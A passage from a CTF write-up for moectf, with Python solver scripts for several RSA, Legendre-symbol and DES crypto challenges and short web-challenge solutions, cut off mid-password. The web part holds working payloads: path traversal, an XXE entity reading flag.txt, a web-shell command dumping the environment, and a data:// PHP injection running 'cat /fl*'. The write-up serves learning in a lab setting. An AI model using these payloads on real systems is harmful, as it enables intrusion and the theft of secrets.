            bit = (lis_round[i][j] >> round_index) & 1  # 修改这里！
            possible_M = [x for x in possible_M if (x > a[i][j] // 2) == bit]
            if not possible_M:
                return None
            matrix_M[i][j] = possible_M[0]

    enc_candidates = [[] for _ in range(16)]
    for i in range(4):
        for j in range(4):
            possible_enc = function_inv(matrix_M[i][j], 251)
            enc_candidates[i * 4 + j] = possible_enc

    from itertools import product
    for enc_list in product(*enc_candidates):
        enc_bytes = bytes(enc_list)
        try:
            prev_state = cipher.decrypt(enc_bytes)
            return prev_state
        except:
            continue
    return None


def reverse_all_rounds(state, lis_list, a):
    current_state = state
    for round_index in range(10):
        current_state = reverse_round(current_state, lis_list, a, round_index)
        if current_state is None:
            return None
    return current_state


# 对两个部分分别进行逆向
flag_part0 = reverse_all_rounds(S0, lis0, a)
flag_part1 = reverse_all_rounds(S1, lis1, a)

if flag_part0 and flag_part1:
    flag = flag_part0 + flag_part1
    print(f"Flag: {flag.decode()}")
else:
    # 尝试第二个平方根
    print("First root failed, trying second square root...")
    S_bytes = long_to_bytes(S2)
    if len(S_bytes) < 32:
        S_bytes = b'\x00' * (32 - len(S_bytes)) + S_bytes
    S0 = S_bytes[:16]
    S1 = S_bytes[16:]
    flag_part0 = reverse_all_rounds(S0, lis0, a)
    flag_part1 = reverse_all_rounds(S1, lis1, a)
    if flag_part0 and flag_part1:
        flag = flag_part0 + flag_part1
        print(f"Flag: {flag.decode()}")
    else:
        print("Failed to recover flag with both roots")
```

### ezHalfGCD

```python
from Crypto.Util.number import long_to_bytes


def mod_inverse(a, n):
    # 使用迭代方法计算模逆
    t, new_t = 0, 1
    r, new_r = n, a

    while new_r != 0:
        quotient = r // new_r
        t, new_t = new_t, t - quotient * new_t
        r, new_r = new_r, r - quotient * new_r

    if r > 1:
        return None  # 模逆不存在
    if t < 0:
        t = t + n
    return t


def poly_degree(p):
    d = len(p) - 1
    while d >= 0 and p[d] == 0:
        d -= 1
    return d


def poly_remainder(a, b, n):
    deg_a = poly_degree(a)
    deg_b = poly_degree(b)
    if deg_b < 0:
        return None
    r = a[:]
    while deg_a >= deg_b:
        lead_r = r[deg_a]
        lead_b = b[deg_b]
        inv_lead_b = mod_inverse(lead_b, n)
        if inv_lead_b is None:
            return None
        factor = lead_r * inv_lead_b % n
        for i in range(0, deg_b + 1):
            idx = deg_a - deg_b + i
            if idx < len(r):
                r[idx] = (r[idx] - factor * b[i]) % n
        deg_a = poly_degree(r)
    return r


def poly_gcd(a, b, n):
    while poly_degree(b) >= 0:
        r = poly_remainder(a, b, n)
        if r is None:
            return None
        a = b
        b = r
    return a


# 主程序
e_val = 11
n = 31166099657280475125475535365831782783093875463247358362475188588947278779261659087382153841735341294644470135658242563894811427195085499234687959821014213884097144683916979145688501653937652132196507641706592058541461494851978378234097501450088696202067780458185699118745693112795064523774316076900622924515043087514299819363383005261432426124907190050031873969718731577577610423430342011833399812571330259167141343053584093492407110726050289284883569075898031613703838488237576756303655189545592872431914967027530453720947545137077577544615857606624432667091058064432254815560483584621525418467954592836937243988243
A = 13808910452602719582082356538103809869422886228259509560372242093772427733416618401205696740074353028623820317050192627491660359558892392153999532272857339481298482802886251848703046960504786528793589170539584003383632027476914361574273144291330585735179166690513545471901763697269194228467287645573188775899890375853801796593582850975578804671547453457528686518397397234277841944184055117669277697362945463508844599947716337314398521363079749738943908860398843430518505690528296941997988869732759053587554475692300841912141199296010163641185664377742397777941968394746150611710777000625916609542525700860321528867212
B = 7712799451523923934297438340493818709638100911475880659269081521797448094000671886662453371669377561442768781648787281763679814952312810588749220640616349121013802986627369725105748412428708271146640375251603852154891826036699121824706508396445679193881511426962350499448921650925902083009038656420224517990418144263810608916613943703387804258988710100695100014625921151006914635066745373266932452264209581055597451243351753611834270245107587926127995770837997657200564139159783438755362906511732933456755615781562673235575025697927723044975521898510169824612319133648292886516647301360818651593931313229819219102145
C = 894510730103475572849584456948777906177928458037601077973815297094718207962800841050676989919558783959100151883021776468599378605624814726543232609670826195546342526501910728018180564277901156145145431115589678554941920392777979439329210254339330200637295639957614541733453280727879958971862238162005775966684182859139832583501267115086918765938983728386252082360729694525611252282765144977858082339098241367689924035089953114271269967974794791094625994785638389602317004891381734713155429498571328372671258967340771255624802290579938944569672935599910907961053536945947262426210286500553262856689698523083914877686

binoms = [1, 11, 55, 165, 330, 462, 462, 330, 165, 55, 11, 1]

for k in range(1, 11):
    print("Trying k =", k)
    C_k = (B * pow(k, e_val, n)) % n

    P = [0] * (e_val + 1)
    P[0] = (-A) % n
    for i in range(1, e_val):
        P[i] = 0
    P[e_val] = 1

    Q = [0] * (e_val + 1)
    for i in range(0, e_val + 1):
        binom = binoms[i]
        term = binom * pow(e_val, i) * pow(-1, i + 1)
        Q[i] = term % n
    Q[0] = (Q[0] - C_k) % n

    g = poly_gcd(P, Q, n)
    if g is None:
        continue
    deg_g = poly_degree(g)
    print("GCD degree:", deg_g)
    if deg_g == 1:
        c = g[1]
        d_val = g[0]
        if c == 0:
            continue
        inv_c = mod_inverse(c, n)
        if inv_c is None:
            continue
        d_candidate = (-d_val * inv_c) % n
        if (e_val * d_candidate - 1) % k == 0:
            phi_candidate = (e_val * d_candidate - 1) // k
            if phi_candidate < n and phi_candidate > 0:
                if pow(phi_candidate, e_val, n) == B:
                    print("Found d:", d_candidate)
                    print("Found phi:", phi_candidate)
                    d_flag = mod_inverse(e_val, phi_candidate)
                    if d_flag is None:
                        continue
                    m = pow(C, d_flag, n)
                    flag = long_to_bytes(m)
                    print("Flag:", flag.decode())
                    exit(0)

print("Not found")
```

### happyRSA

```python
from Crypto.Util.number import long_to_bytes
import math

n = 128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731
e = 65537
c = 125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886
x = 522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141

# Calculate 4x - 3
four_x_minus_3 = 4 * x - 3

# Check if 4x-3 is a perfect square
sqrt_val = math.isqrt(four_x_minus_3)
if sqrt_val * sqrt_val == four_x_minus_3:
    print("4x-3 is a perfect square")
    n_phi = (sqrt_val - 1) // 2
    print("n_phi =", n_phi)
else:
    print("4x-3 is not a perfect square")
    exit()

# Compute φ(n)
phi_n = n - n_phi

# Compute private key d
d = pow(e, -1, phi_n)

# Decrypt message
m = pow(c, d, n)

# Convert to bytes to get flag
flag = long_to_bytes(m)
print(flag.decode())
```

### ezlegendre

```python
p = 258669765135238783146000574794031096183
a = 144901483389896508632771215712413815934

def generate_primes(limit):
    sieve = [True] * (limit+1)
    sieve[0] = sieve[1] = False
    for i in range(2, int(limit**0.5)+1):
        if sieve[i]:
            for j in range(i*i, limit+1, i):
                sieve[j] = False
    primes = [i for i, is_prime in enumerate(sieve) if is_prime]
    return primes

# 生成16位素数
limit = 65536
all_primes = generate_primes(limit)
primes_16 = [p for p in all_primes if p >= 32768 and p <= 65535]
print(f"Number of 16-bit primes: {len(primes_16)}")

# 预计算S0
S0 = set()
for e in primes_16:
    value = pow(a, e, p)
    S0.add(value)

print("S0 computed")

# 预计算S1 for d from 1 to 10
S1_dict = {}
for d in range(1, 11):
    base = a + d
    S1_d = set()
    for e in primes_16:
        value = pow(base, e, p)
        S1_d.add(value)
    S1_dict[d] = S1_d
    print(f"S1 for d={d} computed")

# 现在，ciphertext列表
ciphertext = [102230607782303286066661803375943337852, 196795077203291879584123548614536291210, 41820965969318717978206410470942308653, 207485265608553973031638961376379316991, 126241934830164184030184483965965358511, 20250852993510047910828861636740192486, 103669039044817273633962139070912140023, 97337342479349334554052986501856387313, 159127719377115088432849153087501377529, 45764236700940832554086668329121194445, 35275004033464216369574866255836768148, 52905563179465420745275423120979831405, 17032180473319795641143474346227445013, 29477780450507011415073117531375947096, 55487351149573346854028771906741727601, 121576510894250531063152466107000055279, 69959515052241122548546701060784004682, 173839335744520746760315021378911211216, 28266103662329817802592951699263023295, 194965730205655016437216590690038884309, 208284966254343254016582889051763066574, 137680272193449000169293006333866420934, 250634504150859449051246497912830488025, 124228075953362483108097926850143387433, 232956176229023369857830577971626577196, 149441784891021006224395235471825205661, 118758326165875568431376314508740278934, 222296215466271835013184903421917936512, 49132466023594939909761224481560782731, 406286678537520849308828749751513339, 215122152883292859254246948661946520324, 81283590250399459209567683991648438199, 150395133067480380674905743031927410663, 5710878479977467762548400320726575491, 83627753774286426170934105100463456109, 164968224377869331545649899270867630850, 241057183685774160581265732812497247167, 109136287048010096863680430193408099828, 116313129605409961931811582899075031153, 202739016625709380026000805340243458300, 25408225921774957745573142542576755590, 151336258796933656160956289529558246702, 2947189044370494063643525166023973095, 228678413963736672394976193093568181979, 40627063032321835707220414670018641024, 55446789315226949622969082042881319148, 32219108726651509070669836923591948459, 134454924722414419191920784435633637634, 97952023967728640730045857104376826039, 20659076942504417479953787092276592682, 93281761173713729777326842152860901050, 133634773495582264000160065317239987936, 79976720152435218818731114555425458470, 234654694673289327542859971371886984118, 51332273108989067644245919615090753756, 134120280423303717489979349737802826605, 182001158305920226320085758522717203725, 98408798757865562737462169470346158516, 78200435603900368619334272308272773797, 232796357836930341547987600782979821555, 589106968861493082018132081244848952, 24186003230092331554886767628744415123, 236070626491251466741246103662922841423, 238699080882667864827094121849090696547, 141659873734297659078160283051728812410, 228977113517120063860252637394240795552, 236613527842969921794004708284265628300, 145522034982744654991661857596541755396, 249608374387044047328725156440984678776, 325110572051913836681821746093704556, 171492052199838424502681030556098576483, 156498865212994371079795360268866413702, 196747701509389071931992996873572785043, 70811811603137896158765356680364490781, 83672551582385607422240464086955462541, 117961603623637997457153763936550310698, 224448821395214505399297116719025174412, 4598815373009554321735225938200807251, 194892269604260726530091473301914449005, 127484628022155760909820605666827662175, 208706240846212140439291547368645656474, 14102286481104997303651684152195298336, 6129503335471304345451795609683770657, 103799668048593149396277157385628834185, 185813375481410513002496683918106238351, 233491689316882978147517340230794025796, 46274083097168831187719988888816378961, 119487551553664772614629936285345836934, 84340029922118279362389419277915602509, 88253743193124528032223101368846247085, 227895357640018330099501504941388167432, 92189947144174433744195727086236905626, 83114957902192791332190922428847199876, 173535754090441937731619031520699325122, 192309407933789484835602071782330798398, 255421921600128994923738650157598053776, 155535082468314012733563336837641958625, 49064798421022327310707074253263463055, 161216416471071644769301963857685054031, 252480348817188872515008985698620059851, 75854882798183185741756645038434215611, 256065006192683011190132982128640682537, 87507510173514424105732562474643251223, 163309795132131534875147566536485288212, 253583084320404985699510129361746869059, 253300112521651972637580307326576568313, 239027717080729650738678032571840680727, 117444657686971615526398894470673026034, 215470942802874046857958621181684551426, 58767098748728136687851735836323448020, 249357164697409977883764098879705065535, 174705348385893117518084017669958647345, 211108767177375215605155301209259781232, 57829566748907062397366819001461941421, 88265742700024922112974862134385921564, 80952107622167923709226013231566882261, 236078582132483864916117213281193714198, 193448482646563141692726575550417225891, 245972799166806058223048506073553726233, 10132977708896091601871557249244373666, 201785418152654519825849206312616081028, 15169816744048531212384271865884567710, 122545328290385950043826822277924297182, 202918646192255177261567701479991753600, 32696887488223731055835744711207261936, 88319352182963224921157305627381030375, 92381505322264045777004475690398861771, 189745654013352563126968415157143821842, 152254915005998949299817641843658795579, 198032433618991362619448347415342295581, 84073892809321676935569114878067118319, 82243805869584256211699602267760745768, 61994229948266781537191603999495995852, 253668765227759797787675352833142466255, 38865376724677211964966907748953557125, 134615436811268347303232550777225944929, 176932422465426107783498083830285780588, 207573742393618910694054452362826628208, 200033130835394442710748301293534928706, 127536063935293533700918451145963158658, 219125698281820710910675956971948816959, 179795893258398750139395156587561075767, 69649628109726874051635160004398498964, 241433717681314766463039563422535023524, 202664264135718511331695232476272832350, 205151096657425932591242432052912914182, 210305712465948130683966275157181140301, 196555690055906934925300527324955477733, 66817932643964538216259564711698986077, 95270796440975607179107356182889534333, 123226880424532374188134357659879826495, 53506495440223773538415807620524749240, 19253217887083870834249774316467647628, 165699356396365023442008488156823647206, 107809175498119862854792975070673056027, 250453989887421415931162217952559757164, 171492052199838424502681030556098576483, 133778166882550119563444625306816232463, 149009301604122447269581792013291889175, 9982418254629616281350713836647603294, 203486292122499140756846060502464655972, 157686696123400087437836943220926921848, 88338919773540412238116717043122711811, 113265824169274322024623493892867211478, 5549372099744960679418616304893848801, 12431828907518852062050349123660880165, 183957934738536914983862053251433028750, 42027289270308356303682029801998790750, 117406080036483925915502666019795783905, 154312255292300186042636734144948304054, 143706917273862261295046346995206133170, 50088136095338601440516112338120787526, 250634504150859449051246497912830488025, 8073010289877796888705519374892639903, 40049582814576788803483039836229025416, 227012342545923833983403067401561291645, 201776603581414625783054400184026088994, 55474945478884522762318445841998187357, 221515530211550293408010846844218019597, 172650752042211610909190315288155597255, 67046194931321172530462444254204111483, 207435868835185636819659137800256834557, 188063222224545200294767050268070647452, 58099349021260301211275261896736590564, 23598877596106927870697531042828774738, 58546308516383335224739442370238545000, 58125311541947998710088435169901475101, 238219925698115060748249043752036454438, 203910234934340893915761800653823457631, 190854889967769152565565000250829375099, 37573623890629846209257307181880876288, 226220240200270623843038279593586687278, 144246075981535671790438155977352345487, 14665770553338784222331493932533448756, 37992062606775322664977502677838074649, 47370175759976523832233910009306151684, 97047813247943880266351445874642842468, 237607444658797800072728280983357541134, 174853113478993738890584814806707459112, 17104608155861584438824639050715857607, 83639027011494777283064583268678718843, 237826165608708003941944469905843354705, 231707683915242052796886276983724691027, 146089830852925550139294146760718642221, 25604562707667550478623425477029052785, 108577663147976992047614498924706939204, 69040319834829375335287614995435269276, 169933229202934375632745753379104389929, 72693008284867494808267387710985847974, 158548279589965576940349068403862889270, 49458101234256610254825879149914255140, 24389558269688411084589654047215902968, 210567980379246548727819953025607019254, 110423375132252997825868399832298953831, 109589895677661968369424757992411668628, 66177577069199763925999718357846633613, 83602293803708828242273186265396676466, 172226271050176278536911356541786290551, 85799805809703976643034084477579915867, 179399990302447560847151603157937241688, 81687654752229170984692833277072534294, 160766441640281044008645821822296569868, 100306680611749750243920501921769642984, 42195187332833922597871030332905266026, 238918420772178508359295233180536910768, 221685929158944699801776621298532178665, 209349638787804999657456057184702655805, 183953393268431043006359511952782903516, 137364333131365794683132159746962959967, 15637689373906596015395350692459218048, 145956368418289159411911667337899986262, 197987711355277581048877821432652325207, 125421308989313724733467092345532539875, 90525081516582408488547894471421476595, 107405840115256692042814887586009104950, 71587500700172519801649824611045199280, 10155721246869986043302768283257682883, 100522792569358427133597834727509523742, 244473925018526409824670892423775482110, 50746138425761666610345252577572889037, 142188269919422432629363225167297071042, 8235113926890598897465093754260801947, 174540885017405784646782293055852044631, 171949847901434672429841435895697323702, 34391199559497599434575002007581170988, 7337868660819385932166025474594964373, 89608475952042154068811282935241824949, 162561097613906905390170334328135062933, 252566077272083954707900007055640560669, 4284637988579219107997224848114896904, 220026371387782427901244689037957398829, 86019060485320999498155965142619258089, 19304861731281576405798605142335886482, 123188238667151068575810494833929221938, 125089740978532716086813732154638565196, 252061524500088702951562270741214799294, 89528875472312768404823823905699760649, 63307407053590054220492282094909190524, 24389558269688411084589654047215902968, 43835777110183833958990705735152973942, 196543204310466258426232803779025620993, 225032412767857179129234169288824097261, 50292890880286260984317361296226049436, 64928956886509273090981701066528078331, 25408225921774957745573142542576755590, 235921667882292842303120860570747218086, 217132603855089441017750752624514343437, 11106129204256119599329380588789107048, 147501327490657927610543345089238991876, 158091159632919983870444592039392730373, 254215886971254771885657857148535673338, 129869106474614345624950211566868568809, 10425702332274469498479699675668087022, 136595953187315682777976356839442311764, 1607792140397737044118662059498732982, 23710000155612873207506044342091514799, 118571340370877720354330132780832828911, 194624784476702188629452374731837038856, 51332273108989067644245919615090753756, 240921043405288511960365826273938845156, 158670188709175825212687487436006138030, 133641825913283256858340618209700716053, 43054466484232130048301271684438593412, 20361972967806283315536154125012604660, 135700832615866572032111395529532615300, 160609169788639387827865051539103507016, 100576279475451993660766480883708996211, 215424685541583305069271024253690375127, 60018956375784961551937423504137141702, 107997941230633604720421526632224279451, 219482010609171816035007605036664317041, 22173526221024380740269311947729076493, 249746554302052221287371350978970766087, 93207359085331319264650563354951254906, 221421697282310997113867048083058096452, 61834092635779365101011109381392037516, 162215218701897689647766394615098617152, 141856131587452385513407955541400099703, 177910903795887762773545874929605680469, 228832704523723308335513552177377803295, 229427981969125094398744034150988525118, 217938760689082034514008764751385239765, 3238055163645731541423094980789895030, 42308449860804765793467328093112118974, 254764518926620089428032312378507653680, 215733901156118606036318409454786603209, 59640829345183339336712595595022506261, 33515071724475649656070325837411550208, 51175659069843551646353202764296812462, 211462959696081863041546889096760952490, 230559603938699838189391087728971115767, 85878911733601049548471257838175175563, 214134904074265214033878852207103328297, 160702405980652445507529591230654474171, 223755040649990285320102091954198427148, 166476753890268002826149533120107157745, 26283916639129998224675164834425763384, 232971495542024495583092055361321729894, 79741799146769724681649849525636816379, 228506526471280046809909301748098760369, 167502422063741368765891061653686283332, 26984184590668253713951516794937308166, 105952393031190074432183821281493254, 113823192955281698937767041115166174652, 93264047694114869263275726820602569731, 55481974783112950660682138071588408040, 108961894273530837550182447112767144669, 47975793549419083945738147934068241928, 204024371586357035343484206754422857590, 251859351272989525849999231358507018068, 75939709807860493804628805619699991501, 129031774446142139804436921156668129187, 110764318451937254261883856778359218969, 246404864722813298477426808193494673610, 153818236564405157581869620439634140065, 246125932167584353084676586883038397451]

bits = []
for n in ciphertext:
    if n in S0:
        bits.append('0')
    else:
        found = False
        for d in range(1, 11):
            if n in S1_dict[d]:
                bits.append('1')
                found = True
                break
        if not found:
            print(f"Error: n not found: {n}")
            bits.append('?')  # 但应该不会发生

binary_str = ''.join(bits)
# 现在将二进制字符串转换为字节
flag_bytes = bytearray()
for i in range(0, len(binary_str), 8):
    byte_str = binary_str[i:i+8]
    byte_val = int(byte_str, 2)
    flag_bytes.append(byte_val)

flag = bytes(flag_bytes)
print(flag)
```

### ez_square

```python
from Crypto.Util.number import long_to_bytes
import math

n = 83917281059209836833837824007690691544699901753577294450739161840987816051781770716778159151802639720854808886223999296102766845876403271538287419091422744267873129896312388567406645946985868002735024896571899580581985438021613509956651683237014111116217116870686535030557076307205101926450610365611263289149
c = 69694813399964784535448926320621517155870332267827466101049186858004350675634768405333171732816667487889978017750378262941788713673371418944090831542155613846263236805141090585331932145339718055875857157018510852176248031272419248573911998354239587587157830782446559008393076144761176799690034691298870022190
hint = 5491796378615699391870545352353909903258578093592392113819670099563278086635523482350754035015775218028095468852040957207028066409846581454987397954900268152836625448524886929236711403732984563866312512753483333102094024510204387673875968726154625598491190530093961973354413317757182213887911644502704780304
e = 65537

# 我们有 hint = (p+q)^2 mod n
# 所以 (p+q)^2 = hint + k*n 对于某个整数 k

# 由于 p 和 q 都是 512 位素数，n 是 1024 位
# p+q 大约是 513 位，所以 (p+q)^2 大约是 1026 位
# 而 n 是 1024 位，所以 k 应该很小

# 尝试不同的 k 值
for k in range(1, 10):
    S2 = hint + k * n
    # 检查 S2 是否为完全平方数
    root = math.isqrt(S2)
    if root * root == S2:
        print(f"Found with k = {k}")
        s = root  # s = p+q

        # 现在我们有 p+q = s 和 p*q = n
        # 解二次方程: x^2 - s*x + n = 0
        discriminant = s * s - 4 * n
        if discriminant >= 0:
            sqrt_disc = math.isqrt(discriminant)
            if sqrt_disc * sqrt_disc == discriminant:
                p = (s + sqrt_disc) // 2
                q = (s - sqrt_disc) // 2

                if p * q == n:
                    print(f"p = {p}")
                    print(f"q = {q}")

                    # 计算私钥
                    phi = (p - 1) * (q - 1)
                    d = pow(e, -1, phi)

                    # 解密
                    m = pow(c, d, n)
                    flag = long_to_bytes(m)
                    print(f"Flag: {flag.decode()}")
                    break
else:
    print("未找到合适的 k 值")
```

### baby_next

```python
import math
from Crypto.Util.number import long_to_bytes

n = 96742777571959902478849172116992100058097986518388851527052638944778038830381328778848540098201307724752598903628039482354215330671373992156290837979842156381411957754907190292238010742130674404082688791216045656050228686469536688900043735264177699512562466087275808541376525564145453954694429605944189276397
c = 17445962474813629559693587749061112782648120738023354591681532173123918523200368390246892643206880043853188835375836941118739796280111891950421612990713883817902247767311707918305107969264361136058458670735307702064189010952773013588328843994478490621886896074511809007736368751211179727573924125553940385967
e = 65537

m = math.isqrt(n)
a = m + 1
s = a * a - n
b = math.isqrt(s)
assert b * b == s
p = a - b
q = a + b
assert p * q == n

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
flag = long_to_bytes(m)

print("flag =", flag.decode())
```

### ez_DES

```python
from Crypto.Cipher import DES
import string
import itertools

c = b'\xe6\x8b0\xc8m\t?\x1d\xf6\x99sA>\xce \rN\x83z\xa0\xdc{\xbc\xb8X\xb2\xe2q\xa4"\xfc\x07'
chars = string.ascii_letters + string.digits + string.punctuation

for suffix in itertools.product(chars, repeat=3):
    key_str = 'ezdes' + ''.join(suffix)
    key = key_str.encode('utf-8')
    cipher = DES.new(key, DES.MODE_ECB)
    padded = cipher.decrypt(c)
    n = padded[-1]
    if n < 24 or n > 31:
        continue
    pad_len = 8 - n % 8
    if padded[-pad_len:] == bytes([n]) * pad_len:
        flag_bytes = padded[:n]
        try:
            flag = flag_bytes.decode('utf-8')
            if flag.startswith('moectf{') and flag.endswith('}'):
                print("Found flag:", flag)
                print("Key:", key_str)
                break
        except UnicodeDecodeError:
            continue
```
## Web
### 0 Web入门指北

ksfuck直接在浏览器控制台运行


### 01 第一章 神秘的手镯

js里面搜moe


### 02 第二章 初识金曦玄轨


访问/golden_trail并抓包


### 03 第三章 问剑石！篡天改命！

```Plain
POST /test_talent?level=S HTTP/1.1
Host: 127.0.0.1:62913
Content-Type: application/json
Content-Length: 40

{"manifestation":"flowing_azure_clouds"}
```

没看到hint瞎测半天(

### 05 第五章 打上门来！

../../flag

### 10 第十章 天机符阵

```XML
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/convert.base64-encode/resource=flag.txt"> ]>
<userInfo>
 <阵枢>引魂玉</阵枢>
 <解析>未定义</解析>
 <输出>&ent;</输出>
</userInfo>
```

### 12 第十二章 玉魄玄关·破妄

一句话木马，直接POST:cmd=system('env');

### 16 第十六章 昆仑星途

直接使用data伪协议

```Plain
/?file=data://text/plain,<?php system('cat /fl*');?>
```

### Moe笑传之猜猜爆

在浏览器控制台修改randomNumber值，然后直接输入自己指定的randomNumber值

```Plain
randomNumber = 50;
```

### 01 第一章 神秘的手镯_revenge

首先根据hint的备份文件测试到wanyanzhou.txt.bak

拿到密码

需要输入500次正确密码，直接在控制台输入

```JavaScript
var password = "XqRqsDZWVYjoXvSwMYGklZOGwVpnmPKTPJXhTiFKvhvcseSrXEbawElbdYmJRydaISVcmpLTscDEPSlbIkUNKEvdzivnsrfSCnGolKgQOmVFhxKxhMitBzNeBHNyOgwckpBKdMveKRzqTIrcnvhVgXoxZrjKmuFkFahmHtmTSCKjnjethRbwMPKeJbyLSPAzROgVTuNIChkunCQdCLnoEJWzTscdjGHYzuHJZPMbxqtWteSbkogopAGBxprYdnZEGjfhJfYKlVlVarMHKwlHcIpsHwXgcsvWVKijiTYiQTfpIMHfqyroLmSqLgugtVlDQXeaGTxSWCfkMsMxnucRAxvKeRkUkpnfLrAtMfnBpgwbgLSHsXEPcUxuJwcdxYEfispMnEluMGWPtiKWukWJmcixVbTrgBhRmSqeMWZorscrwsxerZnmKRmbcBIukPQIHOxeoPOXnbngPGdpFrnoDAhCkuQeyDreHKQIutGOwDmQrtuFZYZwPlDMuBZPqPcIDrSHUZvGQKDLARkVfmEQdLeBSVoRAOUJZXAiafPXCMigwuNPzElbajcHnpzBfUvxhDTFvdRsbnvdaYDmyjkNLqrFbRqspCJxrFAJaZkEisEaWkgvnTPTCZvPStbzuAVJRJqcnthlUXbigHdyMERTwFmhGktdbvyHxMWZkIhkMhDUHcrnrqezOsoaZLvifeiFLBUlHJEhtHoStqBtQRenMJPVWLzoFCtBlVSlUaQKnXCedKVGocnoWJiOfnpXVPOxAXQITpeXgfdmszXzOTEdTjqnEPAbQcOfRQFnZPNeygovEvmlhZfKNHQeRcnjHweNceHuFBTciWcFSQNZmIlnpiMkqiQyZOENdGFayRLHRuAHYcFOeZoaWsVwciPUtHRdNxfBtENIVDTPzqnBPdtRdOVWKEaInMAmgTUFSrdghOVOefjxtitiabICQNdLUItQILjyAhCBvnTmzHALWouisBfvTGtHjcYShuKdejEobmfYOypmQRJiKeUAyIGcKPsLDYOVAdIUgujXMsDsOLyrkCqjVAwkJnymwVcIGQPXixGWZWpychnsCINBItKqzcmhoYLWhadHoihjWVBlFgpHKfXpOjXYdhBLjfZUFICrlIEJeDztXIhnMsRITfNhFSjfsQwEktpzryjKvoedbAgFGnIshgIwyJANiKQJzdPdZkckQPVXYAKfekJvIwlQTZOwhjepNEJGhyahbEuNPtkCXVaNVkUvQHRAQVXtAQGTBUlWpZwfuFjKwvjNfzkCmcVeCPUCRSDXKSKQjNOkmeYabmjtNVYclVEredbjBiqXWeMCXaXPltDgneMPJaGIYHyfbWqNLwJCqPsdJxCDvaIuYXDHVLfwPwQuvUGcXvJZmcyACILNBDHnGKXFnUpExHTHrcgyIKCDSzeUsyOYfxnKyAmsUPgWgfdcJuLGAPnLvLnFuKXNUThohGpagqOIucLUtSHYBJvlPzLnJXtBIryPDyWtZuvOcoLBUkWapklHXLNQDonMyunmuoAuqkvdCvWXvIrdXZtHrgwsDuZiytotfKBAMwNGiVDZGlMzPKGpIeFzCLuXYsVXQZfYXoPuBNJyEFNvhlnzDbAieaNycIwKCtysQxbjejrEJVzuaNWpKqaduNtdmAjFpQFKFkoukCGsoscynKmpOTRhBlKlcurfCSzckDmrABkvUnTJBGBjKQeVEZRpfcdNbqEJAGfeaMtKiqfKcmhjngjEuVQaDmgYOdRxGOBGIRBgNCwsUAqNhVxzPkVSkNRLuVbAEApwnXjeipSbNDROtZSuPItgRUIJGcDiSxJwgcqximjKfskPXuHbhowALsYRPrjrteNPhiUKQpFgYlRBHJMuOQPtIYcIPIFHTpwMVpRwRvjpDKzlKmuXZVHAvswCIGoHxMahgaueHzkQhrGXdiXZswbkbpsOFOskXcgBUXBTjXacDJzbqFYhMpQXykStZCMJpmzkBfygwmQERoDIyMCGiJiCmOyTmrepOZIxfPlONsapLxOACdcfxLxsMLUsMziTpqcxAOpFMvghzFYRSwMQmGLDiaQsTZAZurHBSuaFHmXQohjUSqicRyHfrtIKygKBsCdXWTDgzcvHYGnbghSlMeHiMHQZtFoyPoVxyPNgnUxgiXZpXWokTBfnuXLDxqkyBnXWlIwFODufTCoevNmvHKZFAhPNOfuJxnqyfigeihgefMyPRGtjTwPxgkFGleTQOczfIhKVOSAwkfYLzesAxSHaqsWUfdRIxVmgsdedlnRFKHbRIMUHcRELhMLcpGiAJmqmQKECsfpXUvtBcrzRQcORBDNPVlQjdsHZXaHNOhQbdigsdszLIHPnXzqbKhBchruNLjBlaydvIHTVmSlyHtIyCyFocdRlJTozqSQNAvQySRZpNqUPzpQuKWLxUPbhYjvGlEpLWnPenWboqEfEMsAIxdbJQMKfNXakvwtRsTyHMSPOLIGxhLCiEnBnkJLFiDrkLkqBeRqxatdzFjaOVwhEKLAWxHViZadRjfQfoPOnuXPIFLPBnAleremNPcnTwAjgZADfYxlDrtcoQFGubCdTYPFSqXPjOUeAGFuwRvpeQWowxajsTnMcOfPtYBKqJwUQTislZbOsMyBpFCQaQYjSKyxGcSyceUGvtOhxImvTmiMfsmejhFAVALTvdRGAInBuxibmSYloasOJIntRlxjWeQGVklDfBGUkrAfvtNXRVBOvltzigxMUmEIhIjIgwYDWhCUAgQImixmgXDYQHUPRdfNGerNueMivayPSNRheVPTVhPaHDvFPcedCpRGOcAXLBrPnKlyHjDueOZdpfZKabnbdvYilMSALQHjVfkDjXVgsvIyNZEcfobkydwZPfKqTCXgPkPdgVaBmJKIYNmGxStldrBjZAykFDMfoiFIRLGigwdRvilQdycSAuXShvACVReSOifjuWlOSbKhXjfPiYibMxwIOcYtqJDBsbzqsMpsUbnVOVNCBHCVwbaghdaZwKwOcWsFdTxICJWXrEgJKWVrtPLUnYehdKUIbHUxWvzflPvLJMIJdoPNcjlPyZuYbrNgznMPDQIskYGeKHEIxbsAzFGPSbHEYIfnakwrHtifynYQBGcIMtEfSTmzltyveQBEdyrPHurWSEPiEGaGFHNtYqFqZSvMOkfEkFGNUNehiTqrLJMZPmjBSlnkLaQtjTslRqwOSmxZdQzpgBzTFVxLtBnUspHSqUyBLXbRMViuwZnVFyEFEyzlISCdtwpnKanKdroLgotHdEhGyucMuGyqStCiZbxKIlMLvuhLTUNbmXYhZbfTrHGlYbMjsXAiQovPHQrfvEjkiZVgyhEVPRkTzyAucZgafPFGOBXcSkOXKdlZrZpXQOJCKLtzBysNKVkHEgyrQPqnUKXILyujGsFqXzfLpDjewEmzGrGhRCSumVlXrwoBXRljkWHGDUsNUAdZKUDOwejOZifSOHJHiKCYNGtbdQEPaFKPnaYQzfxzGefKtAbRuJoZmHblZmwKrODQVMUOqmIZOuxzraxWdtpcRHFZCJlTdMcQLFVuTlOQNCkEPkRTFPLVNAqImzvpsWcNMPIvulFEhoWSDXlwpeBZxKIZApQOArGWITaVteYWBoEkHlPjHkQwxDnRfDyRXqjbzVgYcTDsMafXLustotnGcrbNyDimSxCiatNVnKgnTuyUYJtUdSAgJwLeFSPuAIfvbaxYNwRgDoGtaQ